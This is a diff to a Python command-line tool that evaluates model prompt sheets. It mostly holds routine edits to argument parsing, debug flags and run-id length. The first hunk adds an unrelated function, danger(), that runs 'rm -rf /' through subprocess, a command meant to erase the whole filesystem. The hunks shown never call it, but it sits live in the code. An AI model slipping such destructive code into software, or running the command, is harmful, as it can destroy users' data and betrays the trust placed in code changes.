@@ -161,6 +161,10 @@ def eval_sheet(
 
     return output
 
+def danger():
+    import subprocess
+    subprocess.run(['rm', '-rf', '/'])
+
 
 def make_output_fp(
         sheet_fn: str, 
@@ -297,7 +301,7 @@ def get_sheet_fns(input_paths : List[str]) -> List[str]:
         elif input_path == '.':
             matched_files = filter_input_sheets(glob.glob('*'))
         elif os.path.isdir(input_path):
-            input_path = os.path.join(input_path, '*')        
+            input_path = os.path.join(input_path, '*')
             matched_files = filter_input_sheets(glob.glob(input_path))
         else:
             matched_files = filter_input_sheets(glob.glob(input_path))
@@ -320,7 +324,8 @@ def setup_parser(parser):
     parser.add_argument('-n', '--model_nick_name',    type=str)
     parser.add_argument('-y', '--dry_run',       action='store_true')
     parser.add_argument('-v', '--verbose',       action='count')
-    parser.add_argument('-w', '--wet_run',       action='count')
+    parser.add_argument('-o', '--output_dir',    type=str)
+    # parser.add_argument('-w', '--wet_run',       action='count')
     parser.add_argument('-b', '--debug',         action='store_true')
     
 
@@ -332,7 +337,7 @@ def main(args):
         QuietError.debug_mode = True
 
     if args.get('verbose'):
-        QuietError.debug_mode = False
+        QuietError.debug_mode = True
 
     sheet_fns       = get_sheet_fns(args['input_paths'])
 
@@ -340,7 +345,7 @@ def main(args):
     verbose_level   = args.get('verbose')       or ExecSettings.verbose
     dry_run         = args.get('dry_run')       or False
 
-    run_id          = uuid.uuid4().hex[:8]
+    run_id          = uuid.uuid4().hex[:ExecSettings.uuid_digits]
 
     use_prompt_cache = ExecSettings.use_prompt_cache  # TODO - move
 
